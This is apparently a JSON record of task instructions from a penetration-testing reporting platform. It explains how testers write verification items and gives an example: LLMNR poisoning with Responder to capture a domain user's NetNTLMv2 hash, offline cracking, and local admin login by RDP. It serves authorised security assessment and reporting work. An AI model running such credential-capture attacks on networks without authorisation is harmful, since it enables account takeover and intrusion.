{"default_url":null,"content":{"state":2,"taskInstructions":"<h2>Instructions</h2><br>All medium and above severity findings should have at least one verification item.<br><br>1. Each scenario and escalation path should be documented in a single verification item.<br><br>2. Each title should begin with the IP address, and be followed by a full sentence ending in a period that includes a description of the step being taken. Ensure relevant usernames, systems, and tools are referenced in the description.  <br><br>3. Ensure each critical finding is pushed to command execution whenever possible.<br><br>4. If you cannot exploit a critical vulnerability due to lack of exploit, availability concerns, or other reason, please note that in the verification so the client has that context.<br><code>     Example<br>     This finding has been included as the result of automated scanning. At this time, exploit code has been published but was not executed as <br>     a part of this assessment due to availability concerns. <br></code><br>5. If the findings results in direct unauthenticated read, write, or command execution on the target system, please mark the finding as an &quot;Entry Point&quot;. This should include all weak and default passwords.<br><br>6. Rating adjustments must be approved by a Practice Director and/or practice lead.<br><br>7. If there is an &quot;Unedited Master Finding&quot;, it may need to be adjusted or rewritten for your instance. Make sure these changed instances are pointed out to the person QAing your workspace and report by leaving an Untracked (&quot;hidden&quot;) comment in Resolve and/or messaging them directly on Slack.  They may also require correlation.<br><br>Below is an example of the format expectations:  <br><br><h3><b>Title Example</b></h3><br>192.168.1.1: It was possible to capture the 'domain.com\\user1' domain user's NetNTLMv2 password hash by spoofing LLMNR responses which lead to unauthorized local administrative access to workstation23.domain.com.<br><br><h3><b>Verification Example</b> </h3><br>1. Perform LLMNR poisoning to capture the NTLMv2 password hash for the domain.com\\user1 domain user.<br><code>┌──(root\uD83D\uDC80kali)-[~/Responder]<br>└─<b>&#35; python Responder.py -I eth0 -r</b>Pv<br>                                        <br>[+] Generic Options:<br>    Responder NIC              [eth0]<br>    Responder IP               [192.168.25.123]<br>    Challenge set              [random]<br>    Don't Respond To Names     ['ISATAP']<br><br>[+] Current Session Variables:<br>    Responder Machine Name     [WIN-4U0L9TSPP9K]<br>    Responder Domain Name      [H1J6.LOCAL]<br>    Responder DCE-RPC Port     [46248]<br><br>[+] Listening for events...<br><b>[TRUNCATED</b>]<br><b>[&#42;] [LLMNR]  Poisoned answer sent to workstation23.domain.com for name</b> dyfpcxqikbp<br><b>[Proxy-Auth] NTLMv2 Client   : workstation23.domain.com</b><br><b><red>[Proxy-Auth] NTLMv2 Username : domain.com\\user</red></b><red>1</red><br><b><red>[Proxy-Auth] NTLMv2 Hash     : user1::domain.com:bc4b1f8ef666e93e:E018ED[REDACTED]000000</red></b>0<br><b>[TRUNCATED</b>]<br></code><br>2. It was possible to crack the NetNTLMv2 password hash offline for the domain.com\\user1.<br><br>3. The domain.com\\user1 credential could then be used to log into workstation23.domain.com as a local administrator.<br><br><b>[RDP LOGIN SCREEN SHOT HERE SHOWING USER AND IP/HOSTNAME]</b> <br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":null}}